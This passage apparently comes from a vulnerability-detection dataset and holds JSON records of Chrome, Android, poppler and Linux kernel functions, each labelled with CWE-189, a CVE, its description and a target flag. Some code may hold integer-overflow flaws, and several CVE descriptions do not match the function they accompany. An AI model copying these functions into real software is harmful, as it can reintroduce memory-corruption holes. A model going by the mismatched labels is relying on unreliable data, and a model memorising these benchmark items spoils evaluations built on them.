StubGLMapBuffer,\n      StubGLUnmapBuffer,\n      NULL,  // glBindFragDataLocationIndexed\n      GrGLInterface::kStaticInitEndGuard,\n    };\n    GrGLSetGLInterface(&host_gl_interface);\n    host_StubGL_installed = true;\n  }\n}\n", "func_hash": 34937403431262051950244809469676497687, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2011-2829", "cve_desc": "Integer overflow in Google Chrome before 13.0.782.215 on 32-bit platforms allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving uniform arrays.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2829"}
{"idx": 163207, "project": "Chrome", "commit_id": "935cb0dee7696d70880f96a71bf5687411bb8cb9", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/935cb0dee7696d70880f96a71bf5687411bb8cb9", "commit_message": "None", "target": 0, "func": "bool SharedMemory::Create(const SharedMemoryCreateOptions& options) {\n  DCHECK(!options.executable);\n  DCHECK(!mapped_file_);\n  if (options.size == 0)\n    return false;\n\n   uint32 rounded_size = (options.size + 0xffff) & ~0xffff;\n  if (rounded_size < options.size)\n    return false;\n   name_ = ASCIIToWide(options.name == NULL ? \"\" : *options.name);\n   mapped_file_ = CreateFileMapping(INVALID_HANDLE_VALUE, NULL,\n       PAGE_READWRITE, 0, static_cast<DWORD>(rounded_size),\n      name_.empty() ? NULL : name_.c_str());\n  if (!mapped_file_)\n    return false;\n\n  created_size_ = options.size;\n\n  if (GetLastError() == ERROR_ALREADY_EXISTS) {\n    created_size_ = 0;\n    if (!options.open_existing) {\n      Close();\n      return false;\n    }\n  }\n\n  return true;\n}\n", "func_hash": 122785357989879634887867508284219942820, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2012-5154", "cve_desc": "Integer overflow in Google Chrome before 24.0.1312.52 on Windows allows attackers to cause a denial of service or possibly have unspecified other impact via vectors related to allocation of shared memory.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-5154"}
{"idx": 163269, "project": "Chrome", "commit_id": "2571533bbb5b554ff47205c8ef1513ccc0817c3e", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/2571533bbb5b554ff47205c8ef1513ccc0817c3e", "commit_message": "None", "target": 0, "func": "void DocumentThreadableLoader::loadRequest(const ResourceRequest& request, ResourceLoaderOptions resourceLoaderOptions)\n{\n    const KURL& requestURL = request.url();\n    ASSERT(m_sameOriginRequest || requestURL.user().isEmpty());\n    ASSERT(m_sameOriginRequest || requestURL.pass().isEmpty());\n\n    if (m_forceDoNotAllowStoredCredentials)\n        resourceLoaderOptions.allowCredentials = DoNotAllowStoredCredentials;\n    resourceLoaderOptions.securityOrigin = m_securityOrigin;\n    if (m_async) {\n        if (!m_actualRequest.isNull())\n            resourceLoaderOptions.dataBufferingPolicy = BufferData;\n\n        if (m_options.timeoutMilliseconds > 0)\n            m_timeoutTimer.startOneShot(m_options.timeoutMilliseconds / 1000.0, BLINK_FROM_HERE);\n\n        FetchRequest newRequest(request, m_options.initiator, resourceLoaderOptions);\n        if (m_options.crossOriginRequestPolicy == AllowCrossOriginRequests)\n             newRequest.setOriginRestriction(FetchRequest::NoOriginRestriction);\n         ASSERT(!resource());\n \n        WeakPtr<DocumentThreadableLoader> self(m_weakFactory.createWeakPtr());\n\n         if (request.requestContext() == WebURLRequest::RequestContextVideo || request.requestContext() == WebURLRequest::RequestContextAudio)\n             setResource(RawResource::fetchMedia(newRequest, document().fetcher()));\n         else if (request.requestContext() == WebURLRequest::RequestContextManifest)\n             setResource(RawResource::fetchManifest(newRequest, document().fetcher()));\n         else\n             setResource(RawResource::fetch(newRequest, document().fetcher()));\n \n        // setResource() might call notifyFinished() synchronously, and thus\n        // clear() might be called and |this| may be dead here.\n        if (!self)\n            return;\n\n         if (!resource()) {\n             InspectorInstrumentation::documentThreadableLoaderFailedToStartLoadingForClient(m_document, m_client);\n             ThreadableLoaderClient* client = m_client;\n             clear();\n            // setResource() might call notifyFinished() and thus clear()\n            // synchronously, and in such cases ThreadableLoaderClient is\n            // already notified and |client| is null.\n            if (!client)\n                return;\n             client->didFail(ResourceError(errorDomainBlinkInternal, 0, requestURL.getString(), \"Failed to start loading.\"));\n             return;\n        }\n\n        if (resource()->loader()) {\n            unsigned long identifier = resource()->identifier();\n            InspectorInstrumentation::documentThreadableLoaderStartedLoadingForClient(m_document, identifier, m_client);\n        } else {\n            InspectorInstrumentation::documentThreadableLoaderFailedToStartLoadingForClient(m_document, m_client);\n        }\n        return;\n    }\n\n    FetchRequest fetchRequest(request, m_options.initiator, resourceLoaderOptions);\n    if (m_options.crossOriginRequestPolicy == AllowCrossOriginRequests)\n        fetchRequest.setOriginRestriction(FetchRequest::NoOriginRestriction);\n    Resource* resource = RawResource::fetchSynchronously(fetchRequest, document().fetcher());\n    ResourceResponse response = resource ? resource->response() : ResourceResponse();\n    unsigned long identifier = resource ? resource->identifier() : std::numeric_limits<unsigned long>::max();\n    ResourceError error = resource ? resource->resourceError() : ResourceError();\n\n    InspectorInstrumentation::documentThreadableLoaderStartedLoadingForClient(m_document, identifier, m_client);\n\n    if (!resource) {\n        m_client->didFail(error);\n        return;\n    }\n\n    if (!error.isNull() && !requestURL.isLocalFile() && response.httpStatusCode() <= 0) {\n        m_client->didFail(error);\n        return;\n    }\n\n    if (requestURL != response.url() && !isAllowedRedirect(response.url())) {\n        m_client->didFailRedirectCheck();\n        return;\n    }\n\n    handleResponse(identifier, response, nullptr);\n\n    if (!m_client)\n        return;\n\n    SharedBuffer* data = resource->resourceBuffer();\n    if (data)\n        handleReceivedData(data->data(), data->size());\n\n    if (!m_client)\n        return;\n\n    handleSuccessfulFinish(identifier, 0.0);\n}\n", "func_hash": 252619243734466223772565356578239503700, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-7909", "cve_desc": "effects/SkDashPathEffect.cpp in Skia, as used in Google Chrome before 39.0.2171.65, computes a hash key using uninitialized integer values, which might allow remote attackers to cause a denial of service by rendering crafted data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-7909"}
{"idx": 164326, "project": "Chrome", "commit_id": "a4acc2991a60408f2044b2a3b19817074c04b751", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/a4acc2991a60408f2044b2a3b19817074c04b751", "commit_message": "None", "target": 0, "func": "void SetBuildInfoAnnotations(std::map<std::string, std::string>* annotations) {\n  base::android::BuildInfo* info = base::android::BuildInfo::GetInstance();\n \n   (*annotations)[\"android_build_id\"] = info->android_build_id();\n   (*annotations)[\"android_build_fp\"] = info->android_build_fp();\n  (*annotations)[\"sdk\"] = base::StringPrintf(\"%d\", info->sdk_int());\n   (*annotations)[\"device\"] = info->device();\n   (*annotations)[\"model\"] = info->model();\n   (*annotations)[\"brand\"] = info->brand();\n  (*annotations)[\"board\"] = info->board();\n  (*annotations)[\"installer_package_name\"] = info->installer_package_name();\n  (*annotations)[\"abi_name\"] = info->abi_name();\n  (*annotations)[\"custom_themes\"] = info->custom_themes();\n  (*annotations)[\"resources_verison\"] = info->resources_version();\n  (*annotations)[\"gms_core_version\"] = info->gms_version_code();\n\n  if (info->firebase_app_id()[0] != '\\0') {\n    (*annotations)[\"package\"] = std::string(info->firebase_app_id()) + \" v\" +\n                                info->package_version_code() + \" (\" +\n                                info->package_version_name() + \")\";\n  }\n}\n", "func_hash": 51170931332779837831032940514223006824, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-5224", "cve_desc": "A timing attack on denormalized floating point arithmetic in SVG filters in Blink in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android allowed a remote attacker to bypass the Same Origin Policy via a crafted HTML page.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-5224"}
{"idx": 164780, "project": "Chrome", "commit_id": "f045c704568e9cf6279b3cbccbec6d86c35f8a13", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/f045c704568e9cf6279b3cbccbec6d86c35f8a13", "commit_message": "None", "target": 0, "func": "void FileSystemManagerImpl::CreateWriter(const GURL& file_path,\n                                          CreateWriterCallback callback) {\n   DCHECK_CURRENTLY_ON(BrowserThread::IO);\n \n  if (!base::FeatureList::IsEnabled(blink::features::kWritableFilesAPI)) {\n    bindings_.ReportBadMessage(\"FileSystemManager.CreateWriter\");\n    return;\n  }\n\n   FileSystemURL url(context_->CrackURL(file_path));\n   base::Optional<base::File::Error> opt_error = ValidateFileSystemURL(url);\n   if (opt_error) {\n    std::move(callback).Run(opt_error.value(), nullptr);\n    return;\n  }\n  if (!security_policy_->CanWriteFileSystemFile(process_id_, url)) {\n    std::move(callback).Run(base::File::FILE_ERROR_SECURITY, nullptr);\n    return;\n  }\n\n  blink::mojom::FileWriterPtr writer;\n  mojo::MakeStrongBinding(std::make_unique<storage::FileWriterImpl>(\n                              url, context_->CreateFileSystemOperationRunner(),\n                              blob_storage_context_->context()->AsWeakPtr()),\n                          MakeRequest(&writer));\n  std::move(callback).Run(base::File::FILE_OK, std::move(writer));\n}\n", "func_hash": 6158478206498632173124392829527322326, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2019-5755", "cve_desc": "Incorrect handling of negative zero in V8 in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to perform arbitrary read/write via a crafted HTML page.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-5755"}
{"idx": 165035, "project": "Android", "commit_id": "e999f077f6ef59d20282f1e04786816a31fb8be6", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/external/sonivox/+/e999f077f6ef59d20282f1e04786816a31fb8be6", "commit_message": "None", "target": 0, "func": "static EAS_RESULT Parse_wave (SDLS_SYNTHESIZER_DATA *pDLSData, EAS_I32 pos, EAS_U16 waveIndex)\n{\n    EAS_RESULT result;\n    EAS_U32 temp;\n    EAS_I32 size;\n    EAS_I32 endChunk;\n    EAS_I32 chunkPos;\n    EAS_I32 wsmpPos = 0;\n    EAS_I32 fmtPos = 0;\n    EAS_I32 dataPos = 0;\n    EAS_I32 dataSize = 0;\n    S_WSMP_DATA *p;\n void *pSample;\n    S_WSMP_DATA wsmp;\n\n /* seek to start of chunk */\n    chunkPos = pos + 12;\n if ((result = EAS_HWFileSeek(pDLSData->hwInstData, pDLSData->fileHandle, pos)) != EAS_SUCCESS)\n return result;\n\n /* get the chunk type */\n if ((result = NextChunk(pDLSData, &pos, &temp, &size)) != EAS_SUCCESS)\n return result;\n\n /* make sure it is a wave chunk */\n if (temp != CHUNK_WAVE)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"Offset in ptbl does not point to wave chunk\\n\"); */ }\n return EAS_ERROR_FILE_FORMAT;\n }\n\n /* read to end of chunk */\n    pos = chunkPos;\n    endChunk = pos + size;\n while (pos < endChunk)\n {\n        chunkPos = pos;\n\n /* get the chunk type */\n if ((result = NextChunk(pDLSData, &pos, &temp, &size)) != EAS_SUCCESS)\n return result;\n\n /* parse useful chunks */\n switch (temp)\n {\n case CHUNK_WSMP:\n                wsmpPos = chunkPos + 8;\n break;\n\n case CHUNK_FMT:\n                fmtPos = chunkPos + 8;\n break;\n\n case CHUNK_DATA:\n                dataPos = chunkPos + 8;\n                dataSize = size;\n break;\n\n default:\n break;\n }\n\n     }\n \n    if (dataSize < 0 || dataSize > MAX_DLS_WAVE_SIZE)\n     {\n         return EAS_ERROR_SOUND_LIBRARY;\n     }\n\n /* for first pass, use temporary variable */\n if (pDLSData->pDLS == NULL)\n        p = &wsmp;\n else\n        p = &pDLSData->wsmpData[waveIndex];\n\n /* set the defaults */\n    p->fineTune = 0;\n    p->unityNote = 60;\n    p->gain = 0;\n    p->loopStart = 0;\n    p->loopLength = 0;\n\n /* must have a fmt chunk */\n if (!fmtPos)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"DLS wave chunk has no fmt chunk\\n\"); */ }\n return EAS_ERROR_UNRECOGNIZED_FORMAT;\n }\n\n /* must have a data chunk */\n if (!dataPos)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"DLS wave chunk has no data chunk\\n\"); */ }\n return EAS_ERROR_UNRECOGNIZED_FORMAT;\n }\n\n /* parse the wsmp chunk */\n if (wsmpPos)\n {\n if ((result = Parse_wsmp(pDLSData, wsmpPos, p)) != EAS_SUCCESS)\n return result;\n }\n\n /* parse the fmt chunk */\n if ((result = Parse_fmt(pDLSData, fmtPos, p)) != EAS_SUCCESS)\n return result;\n\n /* calculate the size of the wavetable needed. We need only half\n     * the memory for 16-bit samples when in 8-bit mode, and we need\n     * double the memory for 8-bit samples in 16-bit mode. For\n     * unlooped samples, we may use ADPCM. If so, we need only 1/4\n     * the memory.\n     *\n     * We also need to add one for looped samples to allow for\n     * the first sample to be copied to the end of the loop.\n     */\n\n /* use ADPCM encode for unlooped 16-bit samples if ADPCM is enabled */\n /*lint -e{506} -e{774} groundwork for future version to support 8 & 16 bit */\n if (bitDepth == 8)\n {\n if (p->bitsPerSample == 8)\n            size = dataSize;\n else\n /*lint -e{704} use shift for performance */\n            size = dataSize >> 1;\n if (p->loopLength)\n            size++;\n }\n\n else\n {\n if (p->bitsPerSample == 16)\n            size = dataSize;\n else\n /*lint -e{703} use shift for performance */\n            size = dataSize << 1;\n if (p->loopLength)\n            size += 2;\n }\n\n /* for first pass, add size to wave pool size and return */\n if (pDLSData->pDLS == NULL)\n {\n        pDLSData->wavePoolSize += (EAS_U32) size;\n return EAS_SUCCESS;\n }\n\n /* allocate memory and read in the sample data */\n    pSample = pDLSData->pDLS->pDLSSamples + pDLSData->wavePoolOffset;\n    pDLSData->pDLS->pDLSSampleOffsets[waveIndex] = pDLSData->wavePoolOffset;\n    pDLSData->pDLS->pDLSSampleLen[waveIndex] = (EAS_U32) size;\n    pDLSData->wavePoolOffset += (EAS_U32) size;\n if (pDLSData->wavePoolOffset > pDLSData->wavePoolSize)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"Wave pool exceeded allocation\\n\"); */ }\n return EAS_ERROR_SOUND_LIBRARY;\n }\n\n if ((result = Parse_data(pDLSData, dataPos, dataSize, p, pSample)) != EAS_SUCCESS)\n return result;\n\n return EAS_SUCCESS;\n}\n", "func_hash": 34491048108805138432896232910231949099, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-3836", "cve_desc": "The Parse_wave function in arm-wt-22k/lib_src/eas_mdls.c in the Sonivox DLS-to-EAS converter in Android before 5.1.1 LMY48I does not reject a negative value for a certain size field, which allows remote attackers to execute arbitrary code or cause a denial of service (buffer overflow) via crafted XMF data, aka internal bug 21132860.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3836"}
{"idx": 165040, "project": "Android", "commit_id": "c82e31a7039a03dca7b37c65b7890ba5c1e18ced", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/av/+/c82e31a7039a03dca7b37c65b7890ba5c1e18ced", "commit_message": "None", "target": 0, "func": "status_t BnHDCP::onTransact(\n uint32_t code, const Parcel &data, Parcel *reply, uint32_t flags) {\n switch (code) {\n case HDCP_SET_OBSERVER:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            sp<IHDCPObserver> observer =\n                interface_cast<IHDCPObserver>(data.readStrongBinder());\n\n            reply->writeInt32(setObserver(observer));\n return OK;\n }\n\n case HDCP_INIT_ASYNC:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n const char *host = data.readCString();\n unsigned port = data.readInt32();\n\n            reply->writeInt32(initAsync(host, port));\n return OK;\n }\n\n case HDCP_SHUTDOWN_ASYNC:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            reply->writeInt32(shutdownAsync());\n return OK;\n }\n\n case HDCP_GET_CAPS:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            reply->writeInt32(getCaps());\n return OK;\n }\n\n\n         case HDCP_ENCRYPT:\n         {\n             size_t size = data.readInt32();\n            size_t bufSize = 2 * size;\n \n            // watch out for overflow\n            void *inData = NULL;\n            if (bufSize > size) {\n                inData = malloc(bufSize);\n            }\n\n            if (inData == NULL) {\n                reply->writeInt32(ERROR_OUT_OF_RANGE);\n                return OK;\n            }\n\n             void *outData = (uint8_t *)inData + size;\n \n             data.read(inData, size);\n\n uint32_t streamCTR = data.readInt32();\n uint64_t inputCTR;\n status_t err = encrypt(inData, size, streamCTR, &inputCTR, outData);\n\n            reply->writeInt32(err);\n\n if (err == OK) {\n                reply->writeInt64(inputCTR);\n                reply->write(outData, size);\n }\n\n            free(inData);\n            inData = outData = NULL;\n\n return OK;\n }\n\n case HDCP_ENCRYPT_NATIVE:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            sp<GraphicBuffer> graphicBuffer = new GraphicBuffer();\n            data.read(*graphicBuffer);\n size_t offset = data.readInt32();\n size_t size = data.readInt32();\n uint32_t streamCTR = data.readInt32();\n void *outData = malloc(size);\n uint64_t inputCTR;\n\n status_t err = encryptNative(graphicBuffer, offset, size,\n                                         streamCTR, &inputCTR, outData);\n\n            reply->writeInt32(err);\n\n if (err == OK) {\n                reply->writeInt64(inputCTR);\n                reply->write(outData, size);\n }\n\n            free(outData);\n            outData = NULL;\n\n return OK;\n }\n\n\n         case HDCP_DECRYPT:\n         {\n             size_t size = data.readInt32();\n            size_t bufSize = 2 * size;\n \n            // watch out for overflow\n            void *inData = NULL;\n            if (bufSize > size) {\n                inData = malloc(bufSize);\n            }\n\n            if (inData == NULL) {\n                reply->writeInt32(ERROR_OUT_OF_RANGE);\n                return OK;\n            }\n\n             void *outData = (uint8_t *)inData + size;\n \n             data.read(inData, size);\n\n uint32_t streamCTR = data.readInt32();\n uint64_t inputCTR = data.readInt64();\n status_t err = decrypt(inData, size, streamCTR, inputCTR, outData);\n\n            reply->writeInt32(err);\n\n if (err == OK) {\n                reply->write(outData, size);\n }\n\n            free(inData);\n            inData = outData = NULL;\n\n return OK;\n }\n\n default:\n return BBinder::onTransact(code, data, reply, flags);\n }\n}\n", "func_hash": 45530985115847920593351830337901498242, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-3834", "cve_desc": "Multiple integer overflows in the BnHDCP::onTransact function in media/libmedia/IHDCP.cpp in libstagefright in Android before 5.1.1 LMY48I allow attackers to execute arbitrary code via a crafted application that uses HDCP encryption, leading to a heap-based buffer overflow, aka internal bug 20222489.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3834"}
{"idx": 165042, "project": "Android", "commit_id": "5e751957ba692658b7f67eb03ae5ddb2cd3d970c", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/av/+/5e751957ba692658b7f67eb03ae5ddb2cd3d970c", "commit_message": "None", "target": 0, "func": "status_t ESDS::parseESDescriptor(size_t offset, size_t size) {\n if (size < 3) {\n return ERROR_MALFORMED;\n }\n\n    offset += 2; // skip ES_ID\n    size -= 2;\n\n unsigned streamDependenceFlag = mData[offset] & 0x80;\n unsigned URL_Flag = mData[offset] & 0x40;\n unsigned OCRstreamFlag = mData[offset] & 0x20;\n\n ++offset;\n\n     --size;\n \n     if (streamDependenceFlag) {\n        if (size < 2)\n            return ERROR_MALFORMED;\n         offset += 2;\n         size -= 2;\n     }\n\n if (URL_Flag) {\n if (offset >= size) {\n\n             return ERROR_MALFORMED;\n         }\n         unsigned URLlength = mData[offset];\n        if (URLlength >= size)\n            return ERROR_MALFORMED;\n         offset += URLlength + 1;\n         size -= URLlength + 1;\n     }\n \n     if (OCRstreamFlag) {\n        if (size < 2)\n            return ERROR_MALFORMED;\n         offset += 2;\n         size -= 2;\n \n if ((offset >= size || mData[offset] != kTag_DecoderConfigDescriptor)\n && offset - 2 < size\n && mData[offset - 2] == kTag_DecoderConfigDescriptor) {\n            offset -= 2;\n            size += 2;\n\n            ALOGW(\"Found malformed 'esds' atom, ignoring missing OCR_ES_Id.\");\n }\n }\n\n if (offset >= size) {\n return ERROR_MALFORMED;\n }\n\n uint8_t tag;\n size_t sub_offset, sub_size;\n status_t err = skipDescriptorHeader(\n            offset, size, &tag, &sub_offset, &sub_size);\n\n if (err != OK) {\n return err;\n }\n\n if (tag != kTag_DecoderConfigDescriptor) {\n return ERROR_MALFORMED;\n }\n\n    err = parseDecoderConfigDescriptor(sub_offset, sub_size);\n\n return err;\n}\n", "func_hash": 260744358754951363009475764927028188653, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1539", "cve_desc": "Multiple integer underflows in the ESDS::parseESDescriptor function in ESDS.cpp in libstagefright in Android before 5.1.1 LMY48I allow remote attackers to execute arbitrary code via crafted ESDS atoms, aka internal bug 20139950, a related issue to CVE-2015-4493.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1539"}
{"idx": 165043, "project": "Android", "commit_id": "d44e5bde18a41beda39d49189bef7f2ba7c8f3cb", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/base/+/d44e5bde18a41beda39d49189bef7f2ba7c8f3cb", "commit_message": "None", "target": 0, "func": "static jobject Bitmap_createFromParcel(JNIEnv* env, jobject, jobject parcel) {\n if (parcel == NULL) {\n SkDebugf(\"-------- unparcel parcel is NULL\\n\");\n return NULL;\n }\n\n    android::Parcel* p = android::parcelForJavaObject(env, parcel);\n\n const bool        isMutable = p->readInt32() != 0;\n const SkColorType colorType = (SkColorType)p->readInt32();\n const SkAlphaType alphaType = (SkAlphaType)p->readInt32();\n const int         width = p->readInt32();\n const int         height = p->readInt32();\n const int         rowBytes = p->readInt32();\n const int         density = p->readInt32();\n\n if (kN32_SkColorType != colorType &&\n            kRGB_565_SkColorType != colorType &&\n            kARGB_4444_SkColorType != colorType &&\n            kIndex_8_SkColorType != colorType &&\n            kAlpha_8_SkColorType != colorType) {\n SkDebugf(\"Bitmap_createFromParcel unknown colortype: %d\\n\", colorType);\n\n         return NULL;\n     }\n \n    SkAutoTDelete<SkBitmap> bitmap(new SkBitmap);\n \n    if (!bitmap->setInfo(SkImageInfo::Make(width, height, colorType, alphaType), rowBytes)) {\n        return NULL;\n    }\n \n     SkColorTable* ctable = NULL;\n     if (colorType == kIndex_8_SkColorType) {\n         int count = p->readInt32();\n        if (count < 0 || count > 256) {\n            // The data is corrupt, since SkColorTable enforces a value between 0 and 256,\n            // inclusive.\n            return NULL;\n        }\n         if (count > 0) {\n             size_t size = count * sizeof(SkPMColor);\n             const SkPMColor* src = (const SkPMColor*)p->readInplace(size);\n            if (src == NULL) {\n                return NULL;\n            }\n             ctable = new SkColorTable(src, count);\n         }\n     }\n \n    jbyteArray buffer = GraphicsJNI::allocateJavaPixelRef(env, bitmap.get(), ctable);\n     if (NULL == buffer) {\n         SkSafeUnref(ctable);\n         return NULL;\n     }\n \n SkSafeUnref(ctable);\n\n size_t size = bitmap->getSize();\n\n    android::Parcel::ReadableBlob blob;\n\n     android::status_t status = p->readBlob(size, &blob);\n     if (status) {\n         doThrowRE(env, \"Could not read bitmap from parcel blob.\");\n         return NULL;\n     }\n \n    bitmap->lockPixels();\n    memcpy(bitmap->getPixels(), blob.data(), size);\n    bitmap->unlockPixels();\n\n \n     blob.release();\n \n    return GraphicsJNI::createBitmap(env, bitmap.detach(), buffer,\n            getPremulBitmapCreateFlags(isMutable), NULL, NULL, density);\n }\n", "func_hash": 122930912420633735294014497673321033140, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1536", "cve_desc": "Integer overflow in the Bitmap_createFromParcel function in core/jni/android/graphics/Bitmap.cpp in Android before 5.1.1 LMY48I allows attackers to cause a denial of service (system_server crash) or obtain sensitive system_server memory-content information via a crafted application that leverages improper unmarshalling of bitmaps, aka internal bug 19666945.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1536"}
{"idx": 165556, "project": "Android", "commit_id": "e8c62fb484151f76ab88b1d5130f38de24ac8c14", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/system/core/+/e8c62fb484151f76ab88b1d5130f38de24ac8c14", "commit_message": "None", "target": 0, "func": " native_handle_t* native_handle_create(int numFds, int numInts)\n {\n    if (numFds < 0 || numInts < 0 || numFds > kMaxNativeFds || numInts > kMaxNativeInts) {\n        return NULL;\n    }\n \n    size_t mallocSize = sizeof(native_handle_t) + (sizeof(int) * (numFds + numInts));\n    native_handle_t* h = malloc(mallocSize);\n     if (h) {\n         h->version = sizeof(native_handle_t);\n         h->numFds = numFds;\n        h->numInts = numInts;\n }\n return h;\n}\n", "func_hash": 145796647662086939942537126268276666048, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1528", "cve_desc": "Integer overflow in the native_handle_create function in libcutils/native_handle.c in Android before 5.1.1 LMY48M allows attackers to obtain a different application's privileges or cause a denial of service (Binder heap memory corruption) via a crafted application, aka internal bug 19334482.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1528"}
{"idx": 184261, "project": "poppler", "commit_id": "c839b706092583f6b12ed3cc634bf5af34b7a2bb", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=c839b706", "commit_message": "[glib] Fix CVE-2009-3607", "target": 0, "func": "create_surface_from_thumbnail_data (guchar *data,\n\t\t\t\t    gint    width,\n\t\t\t\t    gint    height,\n \t\t\t\t    gint    rowstride)\n {\n   guchar *cairo_pixels;\n  gint cairo_stride;\n   cairo_surface_t *surface;\n   int j;\n \n  surface = cairo_image_surface_create (CAIRO_FORMAT_RGB24, width, height);\n  if (cairo_surface_status (surface))\n    return NULL;\n\n  cairo_pixels = cairo_image_surface_get_data (surface);\n  cairo_stride = cairo_image_surface_get_stride (surface);\n \n   for (j = height; j; j--) {\n     guchar *p = data;\n     guchar *q = cairo_pixels;\n     guchar *end = p + 3 * width;\n\n     while (p < end) {\n #if G_BYTE_ORDER == G_LITTLE_ENDIAN\n       q[0] = p[2];\n       q[1] = p[1];\n       q[2] = p[0];\n#else\n       q[1] = p[0];\n       q[2] = p[1];\n       q[3] = p[2];\n#endif\n      p += 3;\n      q += 4;\n     }\n \n     data += rowstride;\n    cairo_pixels += cairo_stride;\n   }\n \n   return surface;\n}\n", "func_hash": 117850736600721186299084927495782979465, "file_name": "poppler-page.cc", "file_hash": 187894592759936494919442607189068850104, "cwe": ["CWE-189"], "cve": "CVE-2009-3607", "cve_desc": "Integer overflow in the create_surface_from_thumbnail_data function in glib/poppler-page.cc in Poppler 0.x allows remote attackers to cause a denial of service (memory corruption) or possibly execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.  NOTE: some of these details are obtained from third party information.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3607"}
{"idx": 184336, "project": "linux", "commit_id": "44afb3a04391a74309d16180d1e4f8386fdfa745", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/44afb3a04391a74309d16180d1e4f8386fdfa745", "commit_message": "drm/i915: fix integer overflow in i915_gem_do_execbuffer()\n\nOn 32-bit systems, a large args->num_cliprects from userspace via ioctl\nmay overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 432e58ed (\"drm/i915: Avoid\nallocation for execbuffer object list\").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Chris Wilson <chris@chris-wilson.co.uk>\nCc: stable@vger.kernel.org\nSigned-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>", "target": 0, "func": "i915_gem_do_execbuffer(struct drm_device *dev, void *data,\n\t\t       struct drm_file *file,\n\t\t       struct drm_i915_gem_execbuffer2 *args,\n\t\t       struct drm_i915_gem_exec_object2 *exec)\n{\n\tdrm_i915_private_t *dev_priv = dev->dev_private;\n\tstruct list_head objects;\n\tstruct eb_objects *eb;\n\tstruct drm_i915_gem_object *batch_obj;\n\tstruct drm_clip_rect *cliprects = NULL;\n\tstruct intel_ring_buffer *ring;\n\tu32 exec_start, exec_len;\n\tu32 seqno;\n\tu32 mask;\n\tint ret, mode, i;\n\n\tif (!i915_gem_check_execbuffer(args)) {\n\t\tDRM_DEBUG(\"execbuf with invalid offset/length\\n\");\n\t\treturn -EINVAL;\n\t}\n\n\tret = validate_exec_list(exec, args->buffer_count);\n\tif (ret)\n\t\treturn ret;\n\n\tswitch (args->flags & I915_EXEC_RING_MASK) {\n\tcase I915_EXEC_DEFAULT:\n\tcase I915_EXEC_RENDER:\n\t\tring = &dev_priv->ring[RCS];\n\t\tbreak;\n\tcase I915_EXEC_BSD:\n\t\tif (!HAS_BSD(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BSD)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[VCS];\n\t\tbreak;\n\tcase I915_EXEC_BLT:\n\t\tif (!HAS_BLT(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BLT)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[BCS];\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown ring: %d\\n\",\n\t\t\t  (int)(args->flags & I915_EXEC_RING_MASK));\n\t\treturn -EINVAL;\n\t}\n\n\tmode = args->flags & I915_EXEC_CONSTANTS_MASK;\n\tmask = I915_EXEC_CONSTANTS_MASK;\n\tswitch (mode) {\n\tcase I915_EXEC_CONSTANTS_REL_GENERAL:\n\tcase 